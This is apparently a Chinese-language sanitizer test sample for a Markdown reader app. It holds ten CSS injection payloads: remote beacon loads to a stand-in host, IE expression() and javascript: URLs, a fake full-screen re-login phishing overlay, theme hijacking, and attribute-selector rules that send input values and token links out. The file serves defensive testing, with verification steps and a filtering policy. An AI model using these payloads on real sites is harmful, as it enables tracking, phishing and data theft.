# XSS 样本 08：style 表达式与 CSS 注入

**攻击手法**：CSS 本身不是脚本，但它能做三件坏事：① 静默发起外网请求（`url()`、`@import`、`@font-face`）用于追踪与数据外带；② 覆盖整个界面做钓鱼（`position:fixed` 全屏遮罩）；③ 老式 IE 的 `expression()` 直接执行 JS。对本应用还有第四条：**用裸色值与全局选择器破坏 Token 主题体系**，让深浅色切换失效。

**预期：脚本不执行、无外网请求。**（额外：界面不被覆盖、主题 Token 不被劫持）

**验证方法**：打开本文件 → 无弹窗 → Network 面板中 `xss-beacon.example.invalid` 零请求（重点看 img/css/font 三类）→ 阅读区外的顶栏/左栏/大纲外观不变 → Elements 面板中 `<style>`/`<link>` 已被剥离。

---

## payload 1：style 标签内的远程背景图（静默追踪）

<style>
  body { background-image: url('https://xss-beacon.example.invalid/08-a-track.png'); }
</style>

## payload 2：@import 拉取远程样式表

<style>
  @import url('https://xss-beacon.example.invalid/08-b-evil.css');
</style>

## payload 3：link 标签引入远程样式表

<link rel="stylesheet" href="https://xss-beacon.example.invalid/08-c-evil.css">

<link rel="preload" as="style" href="https://xss-beacon.example.invalid/08-d-evil.css">

## payload 4：@font-face 拉取远程字体

<style>
  @font-face { font-family: 'XssFont'; src: url('https://xss-beacon.example.invalid/08-e.woff2') format('woff2'); }
  .xss-font-probe { font-family: 'XssFont', sans-serif; }
</style>
<span class="xss-font-probe">这行字会触发远程字体下载</span>

## payload 5：IE 表达式（历史遗留，仍应过滤）

<div style="width: expression(alert('XSS-08-F'));">expression 表达式-F</div>

<div style="background-image: url(javascript:alert('XSS-08-G'))">CSS 里的 javascript 协议-G</div>

<style>
  .xss-behavior { behavior: url(https://xss-beacon.example.invalid/08-h.htc); }
  .xss-moz { -moz-binding: url("https://xss-beacon.example.invalid/08-i.xml#xss"); }
</style>

## payload 6：全屏钓鱼遮罩

<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#0d1117;z-index:2147483647;color:#fff;padding:40px">
  <h2>系统提示：请重新登录飞书以继续</h2>
  <p>这是一个伪造的全屏遮罩。若它盖住了整个应用界面，说明消毒失败。</p>
</div>

## payload 7：劫持主题 Token（破坏 DG 5.5 变量体系）

<style>
  :root { --color-bg: #ff0000 !important; --color-text: #ff0000 !important; --color-brand: #ff0000 !important; }
  * { color: #ff0000 !important; background: #000 !important; }
</style>

预期：顶栏、左栏、大纲、状态栏的配色**不受影响**；文档内容区也不应整体变红。

## payload 8：属性选择器数据外带（CSS exfiltration）

<style>
  input[value^="a"] { background: url('https://xss-beacon.example.invalid/08-j?c=a'); }
  input[value^="b"] { background: url('https://xss-beacon.example.invalid/08-k?c=b'); }
  a[href*="token"] { background: url('https://xss-beacon.example.invalid/08-l?leak=token'); }
</style>

## payload 9：伪元素 content 注入内容

<style>
  .xss-content::after { content: " —— 这段文字是 CSS 注入的，不应出现"; }
  .xss-content::before { content: url('https://xss-beacon.example.invalid/08-m.png'); }
</style>
<p class="xss-content">正常段落</p>

## payload 10：内联 style 属性（最容易被放行的一种）

<p style="background-image:url('https://xss-beacon.example.invalid/08-n.png');color:#ff0000">内联 style 属性-N</p>

<p style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;z-index:99999">内联 style 全屏遮罩-O</p>

---

## 对照组（良性内联样式）

<p style="text-align:center">居中对齐的段落（良性排版样式，保留与否需在报告中记录取舍）</p>

<span style="color:#2f81f7">带颜色的行内文本</span>

> **判定口径**：外网请求为 0 是硬指标；全屏遮罩不得出现；应用外壳配色不得被劫持。
> **策略建议**：`<style>` 与 `<link rel=stylesheet>` 整体剥离；内联 `style` 属性若保留，必须过滤 `url()`、`expression()`、`position:fixed`、`z-index` 超大值，并把作用域限制在阅读区容器内（外壳使用独立的 Token 作用域）。最终取舍写入 M0-② 报告。
